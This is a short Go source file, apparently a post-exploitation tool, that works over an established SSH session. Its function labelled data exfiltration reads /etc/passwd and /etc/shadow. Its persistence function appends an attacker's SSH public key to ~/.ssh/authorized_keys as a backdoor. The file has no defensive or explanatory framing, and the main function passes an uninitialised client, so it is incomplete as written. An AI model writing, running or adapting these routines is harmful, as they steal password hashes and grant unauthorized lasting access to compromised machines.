package post_exploit

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"bytes"
)

func run_command(client *ssh.Client, cmd string) (string, error) {
	session, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()

	var stdout bytes.Buffer
	session.Stdout = &stdout
	err = session.Run(cmd)
	if err != nil {
		return "", err
	}

	return stdout.String(), nil
}

func data_exfiltration(client *ssh.Client) {
	passwd, err := run_command(client, "cat /etc/passwd")
	if err != nil {
		fmt.Println("Error extracting /etc/passwd:", err)
		return
	}
	fmt.Println("[+] Extracted /etc/passwd:\n", passwd)

	shadow, err := run_command(client, "cat /etc/shadow")
	if err != nil {
		fmt.Println("Error extracting /etc/shadow:", err)
		return
	}
	fmt.Println("[+] Extracted /etc/shadow:\n", shadow)
}

func persistence(client *ssh.Client) {
	backdoor_key := "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7j..."
	cmd := fmt.Sprintf("mkdir -p ~/.ssh && echo '%s' >> ~/.ssh/authorized_keys", backdoor_key)
	_, err := run_command(client, cmd)
	if err != nil {
		fmt.Println("Error adding backdoor:", err)
		return
	}
	fmt.Println("[+] Persistence backdoor added")
}

func main() {
	var client *ssh.Client
	data_exfiltration(client)
	persistence(client)
}
